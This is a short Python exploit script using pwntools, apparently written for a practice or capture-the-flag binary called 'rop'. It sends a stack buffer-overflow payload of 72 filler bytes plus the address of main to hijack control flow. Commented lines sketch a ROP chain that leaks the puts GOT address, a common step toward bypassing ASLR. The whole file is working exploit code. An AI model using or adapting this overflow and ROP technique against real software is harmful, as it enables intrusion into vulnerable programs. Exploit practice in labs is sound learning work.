#!/bin/python
# made with the help of https://www.youtube.com/watch?v=i5-cWI_HV8o
from pwn import *
from pprint import pprint

elf = ELF("./rop")
target = elf.process()
#rop = ROP(elf)
#rop.call("puts", [elf.got['puts']])
#rop.call("main")
#print(elf)
#pprint(elf.symbols)

target.recvline() # hey bb
target.recvline() # whats ur name

payload = [
        b"A"*72,
        p64(elf.symbols['main'])
        ]
payload = b"".join(payload)
target.sendline(payload)
target.interactive()
